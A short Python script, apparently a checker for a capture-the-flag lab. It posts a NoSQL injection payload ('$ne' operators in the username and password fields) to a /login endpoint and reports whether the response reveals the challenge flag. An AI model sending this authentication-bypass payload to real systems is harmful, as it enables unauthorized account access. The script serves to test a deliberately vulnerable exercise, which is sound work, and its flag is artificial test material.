from urllib.parse import urljoin

import requests


def check_web_nosql(host_name):
    if "http" not in host_name:
        host_name = "https://" + host_name

    s = requests.session()

    try:
        r = s.get(host_name, timeout=3)
        r.raise_for_status()
    except Exception:
        return 2

    try:
        url = urljoin(host_name, "login")
        r = s.post(
            url,
            json={"username": {"$ne": ""}, "password": {"$ne": "n"}},
            timeout=3,
        )

        if "FLAG{n0_sql_1nj3ction}" in r.text:
            return 0
        return 1

    except:
        return 1


if __name__ == "__main__":
    print(check_web_nosql("http://localhost"))
